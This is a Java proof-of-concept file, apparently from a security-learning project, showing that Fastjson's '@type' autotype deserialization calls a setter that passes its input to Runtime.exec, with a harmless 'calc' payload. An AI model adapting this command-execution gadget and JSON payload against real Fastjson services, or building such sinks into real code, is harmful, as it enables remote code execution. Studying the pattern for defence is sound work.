package com.pacemrc.javasec.deserialize.fastjson;

import java.io.IOException;
import com.alibaba.fastjson.JSON;

class Poc
{
    private String cmd;
    public Poc()
    {
        System.out.println("Method Poc() is called");
    }
    public String getCmd()
    {
        System.out.println("Method getCmd() is called");
        return cmd;
    }
    public void setCmd(String cmd) throws IOException
    {
        System.out.println("Method setCmd is called");
        this.cmd = cmd;
        Runtime.getRuntime()
                .exec(cmd);
    }
}
public class PocTest {
    public static void main(String[] args)
    {
        String Poc = "{\"@type\":\"Poc\",\"cmd\":\"calc\"}";
        JSON.parse(Poc);
        JSON.parseObject(Poc);
        JSON.parseObject(Poc, com.pacemrc.javasec.deserialize.fastjson.Poc.class);
    }
}
